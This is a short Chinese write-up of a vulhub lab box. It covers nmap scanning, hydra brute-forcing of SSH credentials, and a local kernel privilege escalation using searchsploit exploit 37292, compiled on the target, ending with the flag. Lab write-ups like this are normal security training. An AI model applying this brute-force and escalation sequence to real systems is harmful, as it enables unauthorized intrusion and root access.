# 云尘-Potato(Suncsr)1 hydra破解ssh密码

vulhub的题目 继续渗透吧

我们依旧打开nmap开扫

```cobol
首先扫描目标网段
 
nmap -sP 127.25.0.1/24
```

```css
nmap -sS -sV -p- -v 172.25.0.13
 
然后扫描端口
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/b25cd91f8be10aaaa9066051330ff3d1.png" alt="" style="max-height:72px; box-sizing:content-box;" />


获取到两个 80和 7120 80机会很多 22就一次 爆破弱口令报完没有就去80测试

```cobol
hydra -l potato -P 字典 -vV ssh://172.25.0.13:7120
```

擦 还真出了



<img src="https://i-blog.csdnimg.cn/blog_migrate/550b14a1b13c9fce28bba3db0f271b81.png" alt="" style="max-height:173px; box-sizing:content-box;" />


直接ssh链接getshell

然后我们首先看看/etc/passwd

发现没啥 看看内核 有没有poc

```bash
uname -a
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/ca7ba36a68d830664297f0782f57092f.png" alt="" style="max-height:103px; box-sizing:content-box;" />


然后去搜索

kali中的exp搜搜

```cobol
searchsploit ubuntu 3.13.0
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/d59a22fbe5a1bd43c05d4a78b70b5ea0.png" alt="" style="max-height:271px; box-sizing:content-box;" />


有的 这里我犯了错误 我直接通过

```cobol
gcc 37292.c -o /home/37292
```

然后通过python 和 wget 下载执行



<img src="https://i-blog.csdnimg.cn/blog_migrate/9ee22483c7949d33f03a55d643775370.png" alt="" style="max-height:453px; box-sizing:content-box;" />




<img src="https://i-blog.csdnimg.cn/blog_migrate/07ef1078719f5fb5df3b88b71d05b53d.png" alt="" style="max-height:133px; box-sizing:content-box;" />


发现不行

这里笨了 直接把c源代码送进去 gcc即可



<img src="https://i-blog.csdnimg.cn/blog_migrate/31c114b22d8a23d73c03fc2d26e6693b.png" alt="" style="max-height:588px; box-sizing:content-box;" />


提权成功 直接cat flag即可